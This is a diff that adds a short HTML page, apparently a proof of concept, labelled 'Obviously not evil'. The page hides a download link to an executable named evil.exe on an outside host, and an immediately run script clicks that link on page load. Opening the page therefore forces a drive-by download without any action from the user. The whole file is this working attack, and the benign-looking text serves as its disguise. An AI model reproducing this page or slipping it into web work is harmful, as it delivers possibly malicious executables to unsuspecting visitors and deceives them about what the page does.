@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+<p>Obviously not evil</p>
+
+<div onload="download()"></div>
+<a id="dl" style="display: none" 
+    href="https://sciensec.github.io/evil.exe" 
+    download>Download</a>
+
+<script>
+(function download() {
+    document.getElementById('dl').click();
+})()
+</script>
+</body>
+</html>
